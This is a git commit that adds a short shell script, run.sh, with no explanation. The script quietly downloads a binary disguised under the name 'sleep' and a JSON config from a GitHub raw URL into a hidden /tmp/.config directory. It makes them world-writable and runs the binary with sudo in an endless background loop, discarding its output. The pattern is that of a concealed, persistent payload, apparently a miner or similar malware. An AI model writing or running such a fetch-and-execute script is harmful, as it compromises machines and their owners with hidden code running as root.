09cd1f38c6056a787fd7d1bf72e87e9d3156190e
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-01-08 00:28:51 +0800

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+
+mkdir -p /tmp/.config
+wget -qO /tmp/.config/.json https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/x14.json
+wget -qO /tmp/.config/sleep https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/sleep
+chmod -R 777 /tmp/.config
+/bin/sh -c "while true; do nohup sudo /tmp/.config/sleep --config=/tmp/.config/.json >/dev/null; done" &
+
